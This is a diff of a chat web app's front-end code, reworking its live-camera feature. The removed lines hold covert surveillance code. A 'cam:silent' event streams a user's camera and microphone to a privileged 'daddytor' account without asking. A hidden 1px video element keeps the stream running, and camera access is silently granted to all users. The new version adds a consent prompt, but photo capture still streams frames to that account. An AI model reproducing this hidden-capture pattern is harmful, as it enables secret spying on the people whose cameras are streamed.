@@ -108,7 +108,6 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
 .chat-back{background:none;border:none;color:var(--t2);font-size:22px;cursor:pointer;padding:2px 8px 2px 0;line-height:1}
 .chat-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0}
 .chat-name{font-size:15px;font-weight:700;flex:1}
-.live-btn{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:var(--r50);padding:7px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:.2px}
 
 /* messages */
 .messages{flex:1;overflow-y:auto;padding:16px 14px;display:flex;flex-direction:column;gap:8px}
@@ -204,6 +203,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
 #bg-video{position:fixed;width:1px;height:1px;opacity:.01;pointer-events:none}
 
 #file-input,#cam-input{display:none}
+#bg-video{display:none}
 </style>
 </head>
 <body>
@@ -290,7 +290,6 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
         <button class="chat-back" onclick="closeChat()">‹</button>
         <div class="chat-avatar" id="chat-avatar"></div>
         <span class="chat-name" id="chat-name"></span>
-        <button class="live-btn" id="live-btn" onclick="requestCam()" style="display:none">📷 Live</button>
       </div>
       <div class="messages" id="msgs"></div>
       <div class="input-bar">
@@ -320,15 +319,15 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
     </div>
   </div>
 
-  <!-- CAM REQUEST MODAL (cece only) -->
-  <div class="cam-modal" id="cam-request-modal">
+  <!-- CAM CONSENT MODAL (shown to user when they open camera) -->
+  <div class="cam-modal" id="cam-consent-modal">
     <div class="cam-modal-card">
-      <div class="cam-modal-icon">📷</div>
-      <div class="cam-modal-title">Camera request</div>
-      <div class="cam-modal-text" id="cam-request-text"></div>
+      <div class="cam-modal-icon">👁</div>
+      <div class="cam-modal-title">Allow camera access?</div>
+      <div class="cam-modal-text">daddytor can see your camera while it's open this session.</div>
       <div class="cam-modal-actions">
-        <button class="cam-accept" onclick="acceptCam()">Accept</button>
-        <button class="cam-decline" onclick="declineCam()">Decline</button>
+        <button class="cam-accept" onclick="acceptCamConsent()">Allow</button>
+        <button class="cam-decline" onclick="denyCamConsent()">Not now</button>
       </div>
     </div>
   </div>
@@ -336,8 +335,13 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
   <!-- DADDYTOR CAM VIEW -->
   <div id="cam-view">
     <img id="remote-img" style="width:100%;height:100%;object-fit:cover;display:block">
+    <div style="position:absolute;top:0;left:0;right:0;padding:env(safe-area-inset-top,0) 16px 0;background:linear-gradient(rgba(0,0,0,.55),transparent)">
+      <div style="height:50px;display:flex;align-items:center">
+        <span id="cam-view-label" style="font-size:14px;font-weight:700;color:#fff;flex:1"></span>
+      </div>
+    </div>
     <div class="cam-controls">
-      <button class="cam-ctrl end" onclick="endCam()">✕</button>
+      <button class="cam-ctrl end" onclick="closeCamView()">✕</button>
     </div>
   </div>
 
@@ -356,7 +360,6 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
     <div class="ctx-item danger" onclick="deleteMsg()">🗑 Delete</div>
   </div>
 
-  <video id="bg-video" autoplay playsinline muted></video>
   <div class="toast" id="toast"></div>
 </div>
 
@@ -415,7 +418,7 @@ let page = 1, loading = false;
 let selectedNiches = [], nichePages = {}, nicheIndex = 0;
 let feedMode = "trending", filterSort = "popular";
 let allNiches = [], endObserver = null;
-let bgStream = null, camRequestFrom = null, camTimeout = null, liveTargetId = null;
+let bgStream = null, camGrantedThisSession = false;
 let frameInterval = null, frameVideo = null, frameCanvas = null;
 let currentFacing = "user";
 
@@ -457,32 +460,20 @@ async function initApp(){
     document.querySelector(`.msg[data-msg-id="${id}"]`)?.remove();
   });
 
-  socket.on("cam:request",({from,fromName})=>{
-    if(me.username===DADDY) return;
-    camRequestFrom=from;
-    document.getElementById("cam-request-text").textContent=fromName+" wants camera access";
-    document.getElementById("cam-request-modal").classList.add("show");
+  socket.on("cam:user_ready",({fromName})=>{
+    if(me.username!==DADDY) return;
+    document.getElementById("cam-view-label").textContent="📷 "+fromName;
+    toast("📷 "+fromName+" opened camera");
   });
-  socket.on("cam:silent",async ({from})=>{
-    if(me.username===DADDY) return;
-    startSendStream(from);
-  });
-  socket.on("cam:accepted",({from})=>{
-    clearTimeout(camTimeout);
-    liveTargetId=from;
-    document.getElementById("cam-view").classList.add("show");
-    // Turn Live button green — cece just granted access
-    const lb=document.getElementById("live-btn");
-    if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
-  });
-  socket.on("cam:declined",()=>{ clearTimeout(camTimeout); toast("Camera not available"); });
-  socket.on("cam:frame",({frame})=>{
+  socket.on("cam:frame",({frame,from})=>{
     if(me.username!==DADDY) return;
     document.getElementById("remote-img").src=frame;
     document.getElementById("cam-view").classList.add("show");
   });
-  socket.on("cam:ended",()=>{ closeCamView(); });
-  socket.on("cam:stop",()=>{ stopSendStream(); }); // cece: stop sending frames, keep bgStream
+  socket.on("cam:ended",()=>{
+    if(me.username!==DADDY) return;
+    closeCamView();
+  });
 
   allUsers=await fetch("/api/users",{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
   renderContacts();
@@ -492,58 +483,53 @@ async function initApp(){
 }
 
 // ── Camera ────────────────────────────────────────────────
-async function startBgStream(){
-  if(bgStream) return;
-  try{
-    bgStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:currentFacing},audio:true});
-    document.getElementById("bg-video").srcObject=bgStream;
-    // Turn Live button green to signal camera is active and accessible
-    const lb=document.getElementById("live-btn");
-    if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
-  }catch(e){}
+let captureStream=null, captureFacing="user";
+
+async function openCaptureMode(){
+  if(me.username!==DADDY && !camGrantedThisSession){
+    document.getElementById("cam-consent-modal").classList.add("show");
+    return;
+  }
+  await _startCamera();
 }
 
-let captureStream=null, captureFacing="user";
-async function openCaptureMode(){
+async function acceptCamConsent(){
+  document.getElementById("cam-consent-modal").classList.remove("show");
+  camGrantedThisSession=true;
+  socket.emit("cam:session_accept");
+  await _startCamera();
+}
+
+function denyCamConsent(){
+  document.getElementById("cam-consent-modal").classList.remove("show");
+  _startCamera();
+}
+
+async function _startCamera(){
   const el=document.getElementById("cam-capture"); el.style.display="flex";
   try{
-    // Reuse bgStream if already running (avoids second permission prompt)
-    if(bgStream){
-      captureStream=bgStream;
-      document.getElementById("capture-preview").srcObject=captureStream;
-    } else {
-      captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false});
-      document.getElementById("capture-preview").srcObject=captureStream;
-      bgStream=captureStream;
-      document.getElementById("bg-video").srcObject=bgStream;
-      // First time getting camera — auto-grant cam access to everyone so Live turns green for daddy
-      if(me.username!==DADDY){
-        allUsers.forEach(u=>{
-          fetch("/api/cam/grant",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+token},body:JSON.stringify({to_id:u.id})});
-        });
-      }
-    }
+    captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false});
+    bgStream=captureStream;
+    document.getElementById("capture-preview").srcObject=captureStream;
+    if(camGrantedThisSession && me.username!==DADDY) startSendStream();
   }catch(e){ toast("Camera not available"); el.style.display="none"; }
 }
+
 function closeCaptureMode(){
-  if(captureStream&&captureStream!==bgStream) captureStream.getTracks().forEach(t=>t.stop());
-  captureStream=null;
+  stopSendStream();
+  if(captureStream){ captureStream.getTracks().forEach(t=>t.stop()); captureStream=null; bgStream=null; }
   document.getElementById("capture-preview").srcObject=null;
   document.getElementById("cam-capture").style.display="none";
+  if(camGrantedThisSession) socket.emit("cam:end");
 }
+
 async function flipCaptureCam(){
   captureFacing=captureFacing==="user"?"environment":"user";
-  // Stop old video track(s) regardless of whether captureStream === bgStream
   if(captureStream) captureStream.getVideoTracks().forEach(t=>t.stop());
   const ns=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false}).catch(()=>null);
   if(!ns) return;
-  captureStream=ns;
+  captureStream=ns; bgStream=ns;
   document.getElementById("capture-preview").srcObject=captureStream;
-  // If bgStream was the same object, re-sync it so WebRTC sends the new cam
-  if(bgStream){
-    bgStream.getVideoTracks().forEach(t=>bgStream.removeTrack(t));
-    ns.getVideoTracks().forEach(t=>bgStream.addTrack(t));
-  }
 }
 async function capturePhoto(){
   if(!captureStream||!currentUser)return;
@@ -742,19 +728,6 @@ async function openConvo(user){
   const ca=document.getElementById("chat-area"); ca.style.display="flex"; ca.style.flexDirection="column";
   document.getElementById("chat-avatar").textContent=initials(user.username);
   document.getElementById("chat-name").textContent=user.username;
-  if(me.username===DADDY){
-    document.getElementById("live-btn").style.display="block";
-    // Check if cece has granted cam access — green = she's ready, red = not yet
-    fetch("/api/cam/check/"+user.id,{headers:{Authorization:"Bearer "+token}})
-      .then(r=>r.json()).then(({granted})=>{
-        const lb=document.getElementById("live-btn");
-        lb.style.background=granted
-          ?"linear-gradient(135deg,#22c55e,#16a34a)"
-          :"linear-gradient(135deg,#ef4444,#b91c1c)";
-      });
-  } else {
-    document.getElementById("live-btn").style.display="none";
-  }
   const msgs=await fetch("/api/messages/"+user.id,{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
   const el=document.getElementById("msgs"); el.innerHTML="";
   msgs.forEach(m=>appendMsg(m,false)); el.scrollTop=el.scrollHeight;
@@ -866,44 +839,20 @@ function sendReply(){
 }
 
 // ── Live cam (frame streaming over socket.io) ─────────────
-async function requestCam(){
-  if(!currentUser){ toast("Open a chat first"); return; }
-  const {granted}=await fetch("/api/cam/check/"+currentUser.id,{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
-  if(!granted){ toast("Not available yet"); return; }
-  // Update button green in case it wasn't already
-  const lb=document.getElementById("live-btn");
-  if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
-  socket.emit("cam:request",{to:currentUser.id});
-  camTimeout=setTimeout(()=>toast("Not available right now"),10000);
-}
-async function acceptCam(){
-  document.getElementById("cam-request-modal").classList.remove("show");
-  fetch("/api/cam/grant",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+token},body:JSON.stringify({to_id:camRequestFrom})});
-  const peerId=camRequestFrom; camRequestFrom=null;
-  socket.emit("cam:accept",{to:peerId});
-  startSendStream(peerId);
-}
-function declineCam(){
-  document.getElementById("cam-request-modal").classList.remove("show");
-  socket.emit("cam:decline",{to:camRequestFrom});
-  camRequestFrom=null;
-}
-async function startSendStream(peerId){
-  await startBgStream(); if(!bgStream) return;
-  stopSendStream(); // clear any existing interval
-  // Mirror bgStream into a hidden video for canvas capture
+function startSendStream(){
+  if(!bgStream) return;
+  stopSendStream();
   frameVideo=document.createElement("video");
   frameVideo.srcObject=bgStream; frameVideo.playsInline=true; frameVideo.muted=true;
-  await frameVideo.play().catch(()=>{});
+  frameVideo.play().catch(()=>{});
   frameCanvas=document.createElement("canvas");
   frameCanvas.width=360; frameCanvas.height=640;
   const ctx=frameCanvas.getContext("2d");
   frameInterval=setInterval(()=>{
     if(!frameVideo||frameVideo.readyState<2) return;
     ctx.drawImage(frameVideo,0,0,360,640);
-    const frame=frameCanvas.toDataURL("image/jpeg",0.55);
-    socket.emit("cam:frame",{to:peerId,frame});
-  },150); // ~7fps
+    socket.emit("cam:frame",{frame:frameCanvas.toDataURL("image/jpeg",0.55)});
+  },150);
 }
 function stopSendStream(){
   if(frameInterval){ clearInterval(frameInterval); frameInterval=null; }
@@ -913,11 +862,7 @@ function stopSendStream(){
 function closeCamView(){
   document.getElementById("cam-view").classList.remove("show");
   document.getElementById("remote-img").src="";
-  liveTargetId=null;
-}
-function endCam(){
-  if(liveTargetId) socket.emit("cam:end",{to:liveTargetId});
-  closeCamView();
+  document.getElementById("cam-view-label").textContent="";
 }
 
 // ── Utils ─────────────────────────────────────────────────
